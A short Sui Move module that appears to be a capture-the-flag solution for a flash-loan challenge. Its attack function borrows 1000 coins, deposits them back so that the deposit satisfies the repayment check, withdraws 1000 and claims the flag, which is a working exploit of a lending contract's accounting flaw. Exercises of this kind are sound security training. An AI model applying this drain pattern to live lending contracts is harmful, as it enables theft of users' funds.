module ctf::solution {
  use sui::tx_context::{TxContext};
  use movectf::flash::{Self, FlashLender};

  public entry fun attack(self: &mut FlashLender, ctx: &mut TxContext){
    let (loan, receipt) = flash::loan(self, 1000, ctx);
    flash::deposit(self, loan, ctx);
    flash::check(self, receipt);
    flash::withdraw(self, 1000, ctx);
    flash::get_flag(self, ctx);
  }
}
